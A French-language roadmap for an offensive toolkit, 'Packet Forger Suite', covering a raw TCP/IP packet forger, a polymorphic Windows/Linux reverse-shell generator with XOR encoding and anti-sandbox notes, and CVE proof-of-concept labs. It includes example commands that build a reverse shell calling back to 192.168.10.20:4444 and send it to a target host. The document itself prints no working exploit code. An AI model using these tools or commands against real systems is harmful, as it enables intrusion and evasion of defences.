# 🗺️ Feuille de Route - Packet Forger Suite

**Dernière mise à jour** : 2024-12-16  
**Statut** : ✅ Toutes les phases terminées + Refactorisation & Amélioration Ciblée complétée

## 🧭 Principe Directeur

**Un seul cœur stable, plusieurs projets satellites spécialisés.**

- Le projet principal est **agnostique du payload**
- Les projets annexes sont **plug-in / consommateurs du cœur**
- Le lien entre eux est une **interface claire**, pas du code entremêlé

**Analogie** : kernel Linux vs drivers, libpcap vs Wireshark, Metasploit Framework vs modules

## 📦 Structure Modulaire

```
packet-forger-suite/
├── packet-forger-core/        ← TCP/IP bas niveau (C, RFC)
├── packet-forger-payloads/     ← Shellcode / reverse shell (ASM, polymorphisme)
├── packet-forger-labs/         ← CVE & POC contrôlés
├── packet-forger-research/     ← Mémoire, ROP, bypass (recherche)
└── docs/                       ← Documentation partagée
```

## 🔹 Phase 1 — Stabilisation du Core (Priorité Absolue)

### Objectif
Geler le périmètre réseau, supprimer toute logique exploit du core, introduire une API payload opaque.

### Actions

#### 1.1 Nettoyage du Core
- ✅ Supprimer `--cve` et `cve_payloads.c` du core
- ✅ Supprimer les familles RCE applicatives (Command Injection, Désérialisation, Code Injection)
- ✅ Garder uniquement `--rce=buffer_overflow` (injection binaire)
- ✅ Retirer `--unpatchable=lnk` (hors scope réseau)
- ✅ Fusionner `cve_2025_33073.c` dans `smb_client_exploit.c` (module générique)

#### 1.2 Interface Payload Opaque
Créer une interface claire dans le core :

```c
// packet-forger-core/include/payload_interface.h
typedef struct {
    unsigned char *data;
    size_t length;
    const char *description;  // Optionnel, pour debug
} payload_t;

int send_payload(payload_t *payload, transport_profile_t *profile);
```

**Contrat** : Le core transporte des octets, point. Il ne sait pas ce qu'est un shellcode.

#### 1.3 Tests Unitaires Réseau
- ✅ Tests intensifs du handshake TCP (test_handshake.c - 10 tests)
- ✅ Validation RFC 791/793/1122 (test_rfc_compliance.c - 8 tests)
- ✅ Tests de fragmentation IP (test_fragmentation.c - 5 tests)
- ⚠️ Validation Wireshark (tests unitaires créés, validation manuelle recommandée)

### Livrables
- ✅ Core sans logique exploit
- ✅ Interface payload opaque fonctionnelle
- ✅ Suite de tests réseau complète (23 tests au total)
- ✅ Documentation de l'API core

---

## 🔹 Phase 2 — Extraction du Shellcode

### Objectif
Déplacer tout le code NASM dans `packet-forger-payloads`, créer un format de sortie stable.

### Actions

#### 2.1 Migration du Code Shellcode
Déplacer vers `packet-forger-payloads/` :
- ✅ `src/shellcode_generator.c` → `packet-forger-payloads/src/`
- ✅ `src/asm_generator.c` → `packet-forger-payloads/src/`
- ✅ `src/polymorphic_shellcode.c` → `packet-forger-payloads/src/`
- ✅ `src/windows_shellcode_generator.c` → `packet-forger-payloads/src/`
- ✅ `src/bind_shell.c` → `packet-forger-payloads/src/`
- ✅ `src/shellcode_encoder.c` → `packet-forger-payloads/src/`
- ✅ `src/payload_format.c` → Format de sortie (.bin + .json)

#### 2.2 Format de Sortie Stable
✅ Créer un format binaire standard :

```c
// Format : raw binary (.bin)
// Optionnel : metadata JSON (.json)
{
    "platform": "windows",
    "type": "reverse_shell",
    "size": 824,
    "polymorphic": false,
    "encoded": false,
    "lhost": "192.168.10.20",
    "lport": 4444
}
```

**Implémenté** : `payload_format.c` avec support JSON optionnel (fallback manuel si json-c non disponible)

#### 2.3 CLI Indépendante
✅ Créer `packet-forger-payloads` CLI :

```bash
# Génération Windows reverse shell (assembleur)
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --asm --output payload.bin

# Sortie : payload.bin (~824 bytes) + payload.bin.json
```

**Implémenté** : `cli/payload_builder.c` avec support complet Linux/Windows, reverse/bind, polymorphisme, encodage XOR

#### 2.4 Intégration avec le Core
✅ Le core accepte un fichier binaire :

```bash
# 1. Générer le payload
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 --asm --output payload.bin

# 2. Transporter via le core
cd ../packet-forger-core
sudo ./bin/packet-forger-core --payload ../packet-forger-payloads/payload.bin \
    --target 192.168.10.5 --port 80
```

**Relation unidirectionnelle** : `payloads ──▶ core` ✅ Testé et fonctionnel

### Livrables
- ✅ Module payloads indépendant
- ✅ Format de sortie stable (.bin + .json)
- ✅ CLI de génération complète
- ✅ Documentation d'intégration
- ✅ Code assembleur Windows reverse shell fonctionnel (~824 bytes)
- ✅ Documentation Windows : `packet-forger-payloads/docs/WINDOWS_ASM_REVERSE_SHELL.md`

---

## 🔹 Phase 3 — Démonstrations Contrôlées

### Objectif
Créer `packet-forger-labs` avec des scénarios pédagogiques, sans intégration dans le core.

### Actions

#### 3.1 Serveurs Vulnérables
Créer des serveurs de test :
- Buffer overflow contrôlé
- SMB vulnérable (version spécifique)
- HTTP vulnérable (Range header DoS)

#### 3.2 Scénarios Documentés
Documenter clairement :
- **payload reçu ≠ payload exécuté automatiquement**
- Conditions nécessaires à l'exécution
- Limitations et prérequis

#### 3.3 CVE en POC
Déplacer les CVE applicatives :
- Log4Shell → `packet-forger-labs/cve/CVE-2021-44228/`
- Struts → `packet-forger-labs/cve/CVE-2017-5638/`
- Spring4Shell → `packet-forger-labs/cve/CVE-2022-22965/`

**Format** : Documentation + payloads manuels + scripts de test

### Livrables
- ✅ Serveurs vulnérables de test (HTTP, SMB)
- ✅ Scénarios documentés (SCENARIOS.md)
- ✅ POC CVE organisés (CVE-2015-1635, CVE-2020-0796)
- ✅ Guide pédagogique (README.md, INTEGRATION_WORKFLOW.md)

---

## 🔹 Phase 4 — Recherche Avancée (Optionnelle)

### Objectif
Créer `packet-forger-research` pour explorer les limites théoriques sans promesse d'automatisation.

### Actions

#### 4.1 Documentation Mémoire
- ASLR / DEP / Canary
- Techniques de bypass théoriques
- Études de cas

#### 4.2 Templates ROP
- Templates théoriques (pas d'automatisation)
- Analyse de réponses réseau
- Corrélation réseau ↔ mémoire

#### 4.3 Études de Cas
- Scénarios réels documentés
- Limitations identifiées
- Directions de recherche

### Livrables
- ✅ Documentation recherche (ASLR, DEP/NX, Stack Canary)
- ✅ Templates théoriques (ROP templates Linux/Windows)
- ✅ Études de cas (CASE_STUDY_1.md)
- ✅ Aucun lien runtime avec le core (documentation pure)

---

## 🔧 Refactorisation & Amélioration Ciblée

### A. Handshake TCP (Niveau Pro) ✅

**Amélioration** : Valider Seq / Ack / Window Size

**Implémentation** :
- ✅ `tcp_handshake_rfc793.c` : Validation window size ajoutée (RFC 1122)
- ✅ `validate_syn_ack()` : Analyse réelle du SYN-ACK avec validation complète
- ✅ Rejet si incohérence (SEQ, ACK, ou window size invalide)
- ✅ Feedback détaillé sur les incohérences

**Justification** :
- SMB & protocoles stateful
- Évite désynchronisation
- Rapproche du comportement d'une vraie stack TCP

### B. Techniques d'Exploitation Mémoire ⚠️

**Renommage** : `exploit_techniques.c` → `memory_bypass.c`

**Statut** : ⚠️ Non applicable dans le core
- `exploit_techniques.c` n'existe pas dans le core (supprimé lors de la refactorisation)
- Le core est agnostique du payload (principe respecté)
- Cette fonctionnalité appartient à `packet-forger-labs` ou `packet-forger-research`

**Rôle clair** (si implémenté ailleurs) :
- Calcul d'offsets
- Structuration payload BO
- Aucune promesse d'automatisation universelle

**Paramètres** : `--rce-opt="512,520"` reste une excellente abstraction bas niveau (si nécessaire dans labs).

### C. Encapsulation SMB : Analyse des Erreurs ✅

**Amélioration** : Parser les réponses SMB, lire les codes d'erreur

**Implémentation** :
- ✅ `analyze_smb_response()` : Fonction créée dans `smb_wrapper.c`
- ✅ Détection automatique SMB1/SMB2
- ✅ Extraction et analyse des codes de statut
- ✅ Intégration avec `smb_error_handler.c` pour messages détaillés

**Feedback utilisateur** :
- ✅ Échec protocolaire (signature invalide, header incomplet)
- ✅ Échec pré-exécution (paramètres invalides, STATUS_INVALID_PARAMETER)
- ✅ Rejet serveur (STATUS_ACCESS_DENIED, etc.)

**Bénéfice** : Renforce le debug et la crédibilité "outil de recherche".

### D. Shellcode Polymorphe → Anti-Sandbox ✅

**Positionnement** : Le code reste dans `packet-forger-payloads`, le core n'en dépend pas.

**Documentation** :
- ✅ `ANTI_SANDBOX.md` : Documentation complète créée dans `packet-forger-payloads/docs/`
- ✅ Section "anti-sandboxing" avec techniques implémentées
- ✅ Explication des délais et checks environnementaux (documentés, non implémentés)
- ✅ Limitations clairement expliquées (sans vendre comme bypass magique)
- ✅ Avertissements sur ce que les techniques NE FONT PAS

---

## 📚 Documentation & "Marketing Éducatif"

### A. Fonctionnalités Principales — Reformulation

**Remplacer** :
- ❌ "Multi-plateforme"

**Par** :
- ✅ "Génération de shellcode Windows NATIVE et polymorphe (résolution dynamique des API)"

**Pourquoi** :
- Technique rare
- Bas niveau réel
- Différencie du 99% des outils msfvenom-based
- Reste dans le projet annexe payloads

### B. Clarifier les Responsabilités

**Ajouter un encadré clair dans le README** :

```
packet-forger-core ne génère pas de shellcode
packet-forger-payloads ne forge pas de paquets
Les deux communiquent via une interface de payload binaire
```

**Bénéfice** : Tue 90% des critiques possibles.

---

## ✅ Checklist de Migration

### Phase 1 — Nettoyage & Cohérence
- ✅ Suppression CVE haut niveau du core
- ✅ Suppression RCE applicatives
- ✅ Retrait .LNK
- ✅ Fusion SMB spécifique
- ✅ Interface payload opaque

### Phase 2 — Core TCP Avancé
- ✅ Handshake stateful (RFC 793 avec validation SEQ/ACK/Window Size)
- ✅ Fragmentation robuste (IP fragmentation implémentée, conforme RFC 791)
- ✅ Profils TCP OS-like (traffic_stealth.c)
- ✅ Parsing erreurs SMB (analyze_smb_response() implémentée)
- ✅ Tests unitaires réseau (23 tests : handshake, fragmentation, conformité RFC)

### Phase 3 — Payloads Spécialisés
- ✅ Shellcode Windows natif (code NASM complet, résolution dynamique d'API)
- ✅ Polymorphisme (Linux + Windows)
- ✅ Anti-sandbox (documenté dans ANTI_SANDBOX.md)
- ✅ Génération indépendante (CLI complète, format .bin + .json)

### Phase 4 — Labs & Recherche
- ✅ CVE applicatives en POC (CVE-2015-1635, CVE-2020-0796)
- ✅ Scénarios MITM / RCE documentés (SCENARIOS.md, INTEGRATION_WORKFLOW.md)
- ✅ Mémoire & ROP en recherche (packet-forger-research/)

---

## 🎯 Objectifs Finaux

1. **Core stable** : TCP/IP bas niveau, RFC-compliant, agnostique
2. **Payloads spécialisés** : Shellcode natif, polymorphisme, indépendant
3. **Labs pédagogiques** : CVE contrôlées, scénarios documentés
4. **Recherche** : Mémoire, ROP, études théoriques

**Résultat** : Projet modulaire, maintenable, crédible, avec séparation claire des responsabilités.

